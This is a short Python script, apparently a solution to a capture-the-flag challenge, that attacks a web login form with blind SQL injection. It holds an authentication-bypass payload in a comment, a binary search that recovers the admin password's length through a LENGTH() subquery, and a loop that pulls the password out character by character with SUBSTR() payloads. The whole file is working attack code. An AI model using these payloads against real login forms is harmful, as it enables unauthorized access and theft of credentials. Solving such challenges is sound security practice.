import requests

url = "https://ctfq.u1tramarine.blue/q6/"
# data = {"id": "admin", "pass": "' or 1==1 --"}

def getPassLength():
    ok, ng = 0, 100
    while abs(ok - ng) > 1:
        mid = (int)((ok + ng)/2)
        payload = "' or (SELECT LENGTH(pass) FROM user WHERE id = 'admin') >= {0} --".format(mid)
        data = {"id": "admin", "pass": payload}
        response = requests.post(url, data = data)
        if("Congratulations" in response.text):
            ok = mid
        else:
            ng = mid

    print(ok)

def blindSqlInjection():
    flag_text = ""
    for idx in range(1, 22, 1):
        for c in range(0, (1<<7), 1):
            payload = "' or SUBSTR((SELECT pass FROM user WHERE id='admin'), {0}, 1) = '{1}' --".format(idx, chr(c))
            data = {"id": "admin", "pass": payload}
            response = requests.post(url, data = data)
            if("Congratulations" in response.text):
                flag_text = flag_text + chr(c)
                print(chr(c))
                break

    print(flag_text)

